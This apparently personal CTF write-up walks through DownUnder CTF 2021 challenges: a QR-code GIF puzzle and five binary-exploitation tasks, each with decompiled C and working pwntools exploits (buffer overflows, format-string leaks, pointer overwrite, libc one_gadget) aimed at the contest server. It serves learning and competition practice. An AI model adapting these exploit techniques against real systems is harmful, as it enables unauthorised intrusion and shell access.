---
title: "DownUnder CTF 2021"
description: "DownUnder CTF 2021 Pwnable Writeup"
summary: "DownUnder CTF 2021 Pwnable Writeup"
categories: ["Writeup"]
tags: ["Pwnable"]
#externalUrl: ""
date: 2021-09-27
draft: false
authors:
  - th3_5had0w
---

DownunderCTF, the challenges were good i think, i spent my weekend playing this, but a little disappointed that i didn't solve the heap note challenge in-time, i guess "emyeuheappwn" but "heappwnkhongyeuem" hehe... enough joking, let's get started.

To warm up things a little bit i'll start with a basic forensic challenge that i think was pretty fun.

## How to pronounce GIF?

The challenge provided us a [GIF image](https://github.com/th3-5had0w/CTF-contests/raw/master/DownUnderCTF2021/misc/challenge.gif) which each of its frame is a part of some kind of QRCodes.

![](https://github.com/th3-5had0w/CTF-contests/raw/master/DownUnderCTF2021/misc/challenge.gif)

First i used [online service](https://ezgif.com/split) to split GIF into image frames.

After scrolling through the image frames for a while, i realized there are 10 QRCode, each of those QRCodes was splitted into 11 parts. So i wrote a script to merge those splitted part together, and this is it:
```python
from PIL import Image


for j in range(0, 10):
    pos = 0
    ni = Image.new('RGB', (300, 22*12), (255, 255, 255))

    image0 = Image.open('frame_00'+str(j)+'_delay-0.05s.png')
    ni.paste(image0, (0, pos))
    pos+=21
    image0.close()
    image0 = Image.open('frame_01'+str(j)+'_delay-0.05s.png')
    ni.paste(image0, (0, pos))
    pos+=21
    image0.close()
    image0 = Image.open('frame_02'+str(j)+'_delay-0.05s.png')
    ni.paste(image0, (0, pos))
    pos+=21
    image0.close()
    image0 = Image.open('frame_03'+str(j)+'_delay-0.05s.png')
    ni.paste(image0, (0, pos))
    pos+=21
    image0.close()
    image0 = Image.open('frame_04'+str(j)+'_delay-0.05s.png')
    ni.paste(image0, (0, pos))
    pos+=21
    image0.close()
    image0 = Image.open('frame_05'+str(j)+'_delay-0.05s.png')
    ni.paste(image0, (0, pos))
    pos+=21
    image0.close()
    image0 = Image.open('frame_06'+str(j)+'_delay-0.05s.png')
    ni.paste(image0, (0, pos))
    pos+=21
    image0.close()
    image0 = Image.open('frame_07'+str(j)+'_delay-0.05s.png')
    ni.paste(image0, (0, pos))
    pos+=21
    image0.close()
    image0 = Image.open('frame_08'+str(j)+'_delay-0.05s.png')
    ni.paste(image0, (0, pos))
    pos+=21
    image0.close()
    image0 = Image.open('frame_09'+str(j)+'_delay-0.05s.png')
    ni.paste(image0, (0, pos))
    pos+=21
    image0.close()
    image0 = Image.open('frame_10'+str(j)+'_delay-0.05s.png')
    ni.paste(image0, (0, pos))
    pos+=21
    image0.close()
    image0 = Image.open('frame_11'+str(j)+'_delay-0.05s.png')
    ni.paste(image0, (0, pos))
    pos+=21
    image0.close()
    name = "dat"+str(j)+".png"
    ni.save(name, "PNG")
    ni.close()
```

Run this script and i have 10 qrcode, so i just have to scan these:

Many of them were just garbages, and a rickroll link ヽ( ಠ益ಠ )ﾉ, nothing interesting, but then i saw there are 2 weird strings:

`RFVDVEZ7YU1` and `fMV9oYVhYMHJfbjB3P30=`

i immediately realized these are two parts of a 64base encode, so i put them together, decoded it and got the flag:
`DUCTF{aM_1_haXX0r_n0w?}`

## Deadcode

[This challenge](https://github.com/th3-5had0w/CTF-contests/raw/master/DownUnderCTF2021/deadcode/deadcode) is a basic buffer overflow challenge.
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[24]; // [rsp+0h] [rbp-20h] BYREF
  __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = 0LL;
  buffer_init(argc, argv, envp);
  puts("\nI'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.");
  puts("\nWhat features would you like to see in my app?");
  gets(v4);
  if ( v5 == 0xDEADC0DELL )
  {
    puts("\n\nMaybe this code isn't so dead...");
    system("/bin/sh");
  }
  return 0;
}
```

The program use the vulnerable function gets to get user data, so i just need to fill enough padđing and overwrite v5 variable with value `0xdeadc0de`, here is my exploit script:
```python
from pwn import *

payload = b'A'*24+p64(0xdeadc0de)
io = remote('pwn-2021.duc.tf', 31916)
io.sendline(payload)
io.interactive()
```
Flag: `DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}`

## Leaking like a sieve

[This challenge](https://github.com/th3-5had0w/CTF-contests/raw/master/DownUnderCTF2021/leaking/hellothere) is a basic format string challenge.
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [rsp+8h] [rbp-58h]
  char format[32]; // [rsp+10h] [rbp-50h] BYREF
  char s[40]; // [rsp+30h] [rbp-30h] BYREF
  unsigned __int64 v6; // [rsp+58h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  buffer_init(argc, argv, envp);
  stream = fopen("./flag.txt", "r");
  if ( !stream )
  {
    puts("The flag file isn't loading. Please contact an organiser if you are running this on the shell server.");
    exit(0);
  }
  fgets(s, 32, stream);
  while ( 1 )
  {
    puts("What is your name?");
    fgets(format, 32, stdin);
    printf("\nHello there, ");
    printf(format);
    putchar(10);
  }
}
```

The flag was loaded in already before we could input anything, also, the program uses printf without format specifier but pass in our input directly, so it would just be so easy to leak the flag in just one shot, here's my exploit script:
```python
from pwn import *

io = remote('pwn-2021.duc.tf', 31918)

payload = '%6$s'

print(io.recv())
io.sendline(payload)
print(io.recvuntil(b'Hello there, '))
print(io.recv())
```
Flag: `DUCTF{f0rm4t_5p3c1f13r_m3dsg!}`

## Outbackdoor

[This challenge](https://github.com/th3-5had0w/CTF-contests/raw/master/DownUnderCTF2021/outdoor/outBackdoor) is still a classical buffer overflow challenge, but this time i'll overwrite the return pointer instead of overwriting some variable.
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[16]; // [rsp+0h] [rbp-10h] BYREF

  buffer_init(argc, argv, envp);
  puts("\nFool me once, shame on you. Fool me twice, shame on me.");
  puts("\nSeriously though, what features would be cool? Maybe it could play a song?");
  gets(v4);
  return 0;
}

...

int outBackdoor()
{
  puts("\n\nW...w...Wait? Who put this backdoor out back here?");
  return system("/bin/sh");
}
```

So i just need to padding enough to where the return pointer address was and overwrote it, then it's done, my exploit script:
```python
from pwn import *

io = remote('pwn-2021.duc.tf', 31921)
print(io.recv())
payload = b'A'*24+p64(0x00000000004011d7+1)
io.sendline(payload)
io.interactive()
```
Flag: `DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}`

## Babygame

Now this is a good [challenge](https://github.com/th3-5had0w/CTF-contests/raw/master/DownUnderCTF2021/babygame/babygame), not hard but really interesting tho.
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  puts("Welcome, what is your name?");
  read(0, NAME, 0x20uLL);
  RANDBUF = "/dev/urandom";
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      v3 = get_num();
      if ( v3 != 1337 )
        break;
      game();
    }
    if ( v3 > 1337 )
    {
LABEL_10:
      puts("Invalid choice.");
    }
    else if ( v3 == 1 )
    {
      set_username();
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_10;
      print_username();
    }
  }
}
```

After taking a glance at main function, i would be able to notice something:

* the program first read my 32 bytes of input into `NAME` buffer, but the `NAME` buffer also 32 bytes long, and right after that is the pointer (`RANDBUF`) to the string `"/dev/urandom"`

* when i input the number 1337, the program will lead me to a function called `game`, also there are 2 functions called.

Ok, there are 2 more functions i need to check, the `set_username` and `print_username`.
```c
size_t set_username()
{
  FILE *v0; // rbx
  size_t v1; // rax

  puts("What would you like to change your username to?");
  v0 = stdin;
  v1 = strlen(NAME);
  return fread(NAME, 1uLL, v1, v0);
}
```

```c
nt print_username()
{
  return puts(NAME);
}
```

Hmm, now that the vulnerability showed up, at first the program asked me to input 32 byte which filled up the `NAME` buffer entirely, no nullbyte between `RANDBUF` and `NAME`, so when the program call `print_username` it will call `puts` function it will print not only my input but also leak the address of `RANDBUF`, it means i leaked PIE.

The `set_username` read my into `NAME` buffer with the length is the return value of `strlen(NAME)` function, the `strlen` function only stop counting when it reach the nullbyte, but before this i've already filled up the `NAME` buffer entirely with 32 bytes, which means the `strlen` will now read 6 more bytes (length of `RANDBUF`'s address) because there are no nullbyte between them, then i'll be able to input 32 + 6 = 38 bytes, enough to overwrite the address of `RANDBUF`.

Now let's checkout the mysterious `game` function:
```c
unsigned __int64 game()
{
  FILE *stream; // [rsp+8h] [rbp-18h]
  int ptr; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  stream = fopen(RANDBUF, "rb");
  fread(&ptr, 1uLL, 4uLL, stream);
  printf("guess: ");
  if ( get_num() == ptr )
    system("/bin/sh");
  return v3 - __readfsqword(0x28u);
}
```

The program will open RANDBUF (`RANDBUF = /dev/urandom`) to read the first 4 bytes of it, if i could guess those 4 bytes correctly i'll have a shell. But why do i have to guess, when i can just overwrite the `RANDBUF` pointer, so where do i overwrite `RANDBUF` buffer to point to?

I will overwrite it to point right back at the beginning of the `NAME` buffer, and i use function `set_username` to both rewriting `NAME` buffer from garbage into `"flag.txt\0"` and overwriting the `RANDBUF` pointer, the first 4 bytes of flag.txt is always `DUCT (0x54435544 in little-endian hexa)`, that's a free shell isn't it? Here's my exploit:
```python
from pwn import *


io = remote('pwn-2021.duc.tf', 31907)
#io = process('./babygame')

print(io.recv())
payload = b'A'*40
io.sendline(payload)
print(io.recvuntil('> '))
print(io.recvuntil('> '))
io.sendline('2')
io.recv(32)
leak = u64(io.recv(6)+b'\0\0') + 8316
print(hex(leak))
print(io.recvuntil('> '))
io.sendline('1')
print(io.recv())
payload = b'flag.txt'+b'\0'*24+p64(leak)
io.sendline(payload)
print(io.recvuntil('> '))
print(io.recvuntil('> '))
io.sendline('1337')
print(io.recv())
io.sendline('1413698884')
io.interactive()
```
Flag: `DUCTF{whats_in_a_name?_5aacfc58}`

## Oversight

This [challenge](https://github.com/th3-5had0w/CTF-contests/raw/master/DownUnderCTF2021/Oversight/oversight) is funny, don't know why but i like it, i also like a heapnote challenge, but somehow i couldnt do it in time, too stupid maybe? Dunno =]]

[libc](https://github.com/th3-5had0w/CTF-contests/raw/master/DownUnderCTF2021/Oversight/libc-2.27.so)
```c
int wait()
{
  unsigned int v0; // eax
  char s[5]; // [rsp+Bh] [rbp-85h] BYREF
  char format[120]; // [rsp+10h] [rbp-80h] BYREF

  puts("Press enter to continue");
  getc(stdin);
  printf("Pick a number: ");
  fgets(s, 5, stdin);
  v0 = strtol(s, 0LL, 10);
  snprintf(format, 0x64uLL, "Your magic number is: %%%d$llx\n", v0);
  printf(format);
  return introduce();
}

int introduce()
{
  puts("Are you ready to echo?");
  get_num_bytes();
  return puts("That was fun!");
}

int get_num_bytes()
{
  unsigned int v0; // eax
  int result; // eax
  char s[13]; // [rsp+Bh] [rbp-15h] BYREF

  printf("How many bytes do you want to read (max 256)? ");
  fgets(s, 5, stdin);
  v0 = strtol(s, 0LL, 10);
  if ( v0 > 0x100 )
    result = puts("Don't break the rules!");
  else
    result = echo(v0);
  return result;
}

```

The program first have format string vulnerability to leak data, which i used to leak libc, when finished leaking libc i overwrite the return pointer of `get_num_bytes` function to return to the `one_gadget` in libc by stack spraying technique, sometimes it doesn't work, so if the shell doesn't pop up just retry a few times, this is my script:
```python
from pwn import *
#io = process('./oversight', env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF('./libc-2.27.so')
io = remote('pwn-2021.duc.tf', 31909)

print(io.recv())
io.send(b'\n')
print(io.recv())
io.sendline(b'15')
print(io.recvuntil(b'Your magic number is: '))
libc.address = int(io.recvline(), 16) - 0x8d4d3
print(io.recv())
payload = p64(libc.address+0x4f432)*25 + 6*b'\0\0\0\0\0\0\0\0' +b'BBBBBBB'
io.sendline('256')
io.sendline(payload)
print(io.recv())
io.interactive()
```
Flag: `DUCTF{1_sm@LL_0ver5ight=0v3rFLOW}`

Thanks for reading my boring writeup, have a good day fellas =]]